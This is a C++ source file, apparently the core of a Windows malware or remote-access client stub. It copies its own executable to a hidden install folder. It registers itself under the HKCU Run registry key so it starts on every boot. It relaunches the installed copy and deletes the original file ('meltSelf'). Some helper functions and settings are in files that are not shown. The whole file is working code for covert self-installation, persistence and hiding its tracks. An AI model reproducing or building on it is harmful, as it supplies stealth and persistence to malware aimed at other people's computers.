/*

					SETTINGS CAN BE EDITED IN "settings.cpp"

*/


#include "includes.h"

using namespace std;

//TESTFUNC

void testMB(string s)		//TEST FUNCTION
{
	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC



void setLocation()			//sets location(copies file)
{
	if (!directoryExists(installFolder.c_str()))
		if (!CreateDirectory(installFolder.c_str(), NULL))	//tries to create folder		
		{
																						//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
		}
	CopyFile(currentPath.c_str(), installPath.c_str(), 0);
}



bool locationSet()		//checks if executable is located in install position
{
	if (currentPath == installPath)
		return true;
	else
		return false;
}

bool startupSet()		//checks if executable is starting on boot
{
	if (regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName.c_str()))
		return true;
	else
		return false;
}

bool installed()		//checks if executable is installed properly (location + startup)
{
	if (startupSet() && locationSet())
		return true;
	else
		return false;
}

void installCheck()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
{
	if (installing)
		if (!startOnNextBoot)
		{
			startProcess(installPath.c_str(), meltSelf ? convStringToLPTSTR("t " + currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
		}

}

int init()		//startup of program
{
	//VARIABLE SETUP
	currentPath = getCurrentPath();
	installFolder = getInstallFolder();
	installPath = getInstallPath(installFolder);



	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && meltSelf)
	{
		remove(lpArguments);
	}

	if (installSelf)
	{
		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
		{
			setLocation();
			installing = true;
		}
	}

	if (setStartupSelf)
	{
		if (!startupSet())
		{
			setStartup(convStringToWidestring(startupName).c_str(), installSelf ? convStringToWidestring(installPath).c_str() : convStringToWidestring(currentPath).c_str(), NULL);
		}
	}
	

	installCheck();


	return installing ? 1 : 0;
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//VARIABLE SETUP
	lpArguments = lpCmdLine;


	if (init() == 1)
		return 0;


	return 0;
}